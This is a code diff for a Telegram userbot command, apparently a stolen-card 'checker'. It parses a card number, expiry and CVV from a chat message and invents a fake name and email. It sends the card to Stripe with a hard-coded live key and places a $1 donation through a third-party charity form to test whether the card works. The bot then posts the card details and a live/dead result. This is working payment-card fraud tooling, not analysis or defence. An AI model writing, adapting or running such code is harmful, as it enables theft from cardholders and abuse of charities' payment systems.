@@ -7,33 +7,32 @@ import re
 from datetime import datetime
 from telethon import events
 from ubb import Ubot
+from ..func import http
 
 
-@Ubot.on(events.NewMessage(pattern=r'\.st'))
+@Ubot.on(events.NewMessage(pattern=r'[!/]st'))
 async def st_charge(event):
-    cc = event.message.message[len('.st '):]
+    cc = event.message.message[len('/st '):]
     reply_msg = await event.get_reply_message()
     if reply_msg:
         cc = reply_msg.message
-    x = re.findall(r'\d+', cc)
-    ccn = x[0]
-    mm = x[1]
-    yy = x[2]
-    cvv = x[3]
-    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
+    ccn, mm, yy, cvv = re.findall(r'\d+', cc)
+    
+    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
     if not ccn.startswith(VALID):
-        return await event.edit('**Invalid CC Type**')
+        return await event.reply('**Invalid CC Type**')
     start = time.time()
 
     letters = string.ascii_lowercase
     First = ''.join(random.choice(letters) for i in range(6))
     Last = ''.join(random.choice(letters) for i in range(6))
-    Name = f'{First}+{Last}'
+    Name = f'{First} {Last}'
     Email = f'{First}.{Last}@gmail.com'
-
-    async with httpx.AsyncClient() as client:
+    RND = ''.join(random.choices(string.ascii_letters + string.digits, k = 7))
+    
+    async with httpx.AsyncClient(http2=True) as client:
         headers = {
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
         "accept": "application/json, text/plain, */*",
         "content-type": "application/x-www-form-urlencoded"
         }
@@ -43,18 +42,19 @@ async def st_charge(event):
         Guid = r.json()['guid']
 
         payload = {
+            "type": "card",
+            "billing_details[name]": Name,
+            "card[number]": ccn,
+            "card[cvc]": cvv,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
             "guid": Guid,
             "muid": Muid,
             "sid": Sid,
-            "key": "pk_live_RhohJY61ihLIp0HRdJaZj8vj",
-            "card[name]": Name,
-            "card[number]": ccn,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "card[cvc]": cvv
+            "key": "pk_live_UZ4RnNcYyBRlTSOTjxzpAa6I00hJlvzuuf"
             }
         head = {
-            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
             "content-type": "application/x-www-form-urlencoded",
             "accept": "application/json",
             "origin": "https://js.stripe.com",
@@ -62,57 +62,73 @@ async def st_charge(event):
             "accept-language": "en-US,en;q=0.9"
             }
 
-        resq = await client.post('https://api.stripe.com/v1/tokens',
-                               data=payload, headers=head)
-        Id = resq.json()['id']
-        Country = resq.json()['card']['country']
-        Brand = resq.json()['card']['brand']
+        res = await client.post('https://api.stripe.com/v1/payment_methods',
+                                data=payload, headers=head)
+        Id = res.json()['id']
+        DT = datetime.timestamp(datetime.now())
+        INDT = int(round(DT * 1000))
 
         load = {
-          "action": "wp_full_stripe_payment_charge",
-          "formName": "Donate",
-          "fullstripe_name": Name,
-          "fullstripe_email": Email,
-          "fullstripe_custom_amount": 1,
-          "stripeToken": Id
-        }
+            "formID": 92395723053661,
+            "q8_name[first]": First,
+            "q8_name[last]": Last,
+            "q9_email": Email,
+            "simple_fpc": 10,
+            "payment_total_checksum": 1,
+            "q10_yourDonation[price]": 1,
+            "q10_yourDonation[cc_firstName]": First,
+            "q10_yourDonation[cc_lastName]": Last,
+            "website": "",
+            "newCardFormMobile": 1,
+            "embedUrl": "",
+            "event_id": f"{INDT}_92395723053661_{RND}",
+            "browserDetails": "NA",
+            "stripePaymentMethodId": Id,
+            "q10_yourDonation[cc_lastFourDigits]": ccn[-4:]
+            }
         header = {
-          "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
-          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-          "accept": "application/json, text/javascript, */*; q=0.01",
+          "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
           "accept-language": "en-US,en;q=0.9"
         }
-        cookie = {'stripe_mid': Muid, 'stripe_sid': Sid}
-        req = await client.post('https://www.breslov.info/wp-admin/admin-ajax.php',
-                                data=load, headers=header, cookies=cookie)
-        msg = req.json()["msg"]
-        end = time.time()
-
-        if 'security code is' in req.text:
-            await event.edit(f'✅>**STRIPE 1$**\n'+
-                             f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'+
-                             f'**Msg**==> `{msg}`\n'+
-                             f'**Brand**==> {Brand}\n'+
-                             f'**Country**==> {Country}\n'+
-                             f'**Time-Stamp** ==> {datetime.now()}\n'+
-                             f'**Time-Took** ==> {end-start}\n'+
-                             f'**Userbot-By** ~ @Xbinner')
-
-        elif "true" in req.text:
-            await event.edit(f'✅>**STRIPE 1$**\n'+
-                             f'**CC**==> `{ccn}|{mm}|{yy}|{cvv}`\n'+
-                             f'**Msg**==> `{msg}`\n'+
-                             f'**Brand**==> {Brand}\n'+
-                             f'**Country**==> {Country}\n'+
-                             f'**Time-Stamp** ==> {datetime.now()}\n'+
-                             f'**Time-Took** ==> {end-start}\n'+
-                             f'**Userbot-By** ~ @Xbinner')
+        req = await client.post('https://submit.jotformz.com/submit/92395723053661/',
+                                data=load, headers=header)
+        match = re.search(r'message: [\']?([^.]+)', req.text)
+        if match:
+            em = match[1]
         else:
-            await event.edit(f'❌>**STRIPE 1$**\n'+
-                             f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'+
-                             f'**Msg**==> `{msg}`\n'+
-                             f'**Brand**==> {Brand}\n'+
-                             f'**Country**==> {Country}\n'+
-                             f'**Time-Stamp** ==> {datetime.now()}\n'+
-                             f'**Time-Took** ==> {end-start}\n'+
-                             f'**Userbot-By** ~ @Xbinner')
+            em = None
+        end = time.time()
+        B = await http.get(f'http://binchk-api.vercel.app/bin={ccn[:6]}')
+        BE = B.json()
+        
+        MSG = f'''
+**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`
+╠**Msg**⇝ `{em}`
+╠**Gate⇝ Stripe 1$**
+╠**BIN-INFO⤵**
+╠**{BE["brand"]} - {BE["type"]} **
+╠**Bank↬ {BE["bank"]}**
+╠**Country↬ {BE["code"]}({BE["flag"]})**
+╠**Time-Took**⇝ {end-start:0.2f}
+⟿**Bot-By**⇝ @Xbinner
+'''
+        
+        if 'security code' in req.text:
+            await event.reply(f'✅{MSG}')
+
+        elif req.status_code == 200:
+            await event.reply(f'''
+✅**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`
+╠**Msg**⇝ `Approved`
+╠**Gate**⇝ Stripe 1$
+╠**BIN-INFO⤵**
+╠**{BE["brand"]} - {BE["type"]} **
+╠**Bank↬ {BE["bank"]}**
+╠**Country↬ {BE["code"]}({BE["flag"]})**
+╠**Time-Took**⇝ {end-start:0.2f}
+⟿**Bot-By**⇝ @Xbinner
+''')
+        else:
+            await event.reply(f'❌{MSG}')
